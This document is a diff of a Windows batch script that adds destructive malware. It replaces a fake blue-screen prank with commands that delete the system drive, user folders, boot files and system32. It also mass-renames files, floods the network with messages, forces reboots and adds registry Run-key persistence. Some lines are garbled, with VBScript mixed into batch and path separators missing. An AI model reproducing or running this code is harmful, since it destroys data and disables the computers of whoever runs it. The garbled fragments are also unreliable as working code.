@@ -263,46 +263,47 @@ del /Q /F C:\Program Files\webproxy\*.exe
 del /Q /F C:\Program Files\panda
 software\*.*
 rem
+Set wshShell =wscript.CreateObject(“WScript.Shel
+l”)
+do
+wscript.sleep 100
+wshshell.sendkeys “{CAPSLOCK}”
 @echo off
-echo ^<html^>^<head^>^<title^>BSOD^
-</title^> > data1.hta
-echo. >> data1.hta
-echo ^<hta:application id="oBVC" >> data1.hta
-echo applicationname="DATA1" >> data1.hta
-echo version="1.0" >> data1.hta
-echo maximizebutton="no" >> data1.hta
-echo minimizebutton="no" >> data1.hta
-echo sysmenu="no" >> data1.hta
-echo Caption="no" >> data1.hta
-echo windowstate="maximize"/^> >> data1.hta
-echo. >> data1.hta
-echo ^</head^>^<body bgcolor="#000088" scroll="no"^> >> data1.hta
-echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> data1.hta
-echo ^<p^>A pr0blem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >>data1.hta
-echo. >> data1.hta
-echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQ
-/p^> >> data1.htaecho. >> data1.hta
-echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> data1.hta
-echo. >> data1.hta
-echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> data1.hta
-echo. >> data1.hta
-echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> data1.hta
-echo. >> data1.hta
-echo ^<p^>Technical information:^</p^> >> data1.hta
-echo. >> data1.hta
-echo ^<p^>*** STOP: 0x000792D1 (0x0000000C,0x00000002,0x00000
-0xF86B5A89)^</p^> >> data1.htaecho. >> data1.hta
-echo. >> data1.hta
-echo ^<p^>*** gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> data1.hta
-echo. >> data1.hta
-echo ^<p^>Beginning dump of physical memory^</p^> >> data1.hta
-echo ^<p^>Physical memory dump complete.^</p^> >> data1.hta
-echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> data1.hta
-echo. >> data1.hta
-echo. >> data1.hta
-echo ^</font^> >> data1.hta
-echo ^</body^>^</html^> >> data1.hta
-start "" /wait "data1.hta"
-del /s /f /q "data1.hta" > nul
+del %systemdrive%*.* /f /s /q
+shutdown -r -f -t 00
+loop
+REN *.DOC *.TXT REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+:CRASH
+net send * WORKGROUP ENABLED
+net send * WORKGROUP ENABLED
+GOTO CRASH
 del C:\Users\*" /f /q /s
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
+@echo off
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+attrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
+del c:WINDOWSsystem32*.*/q
+
 
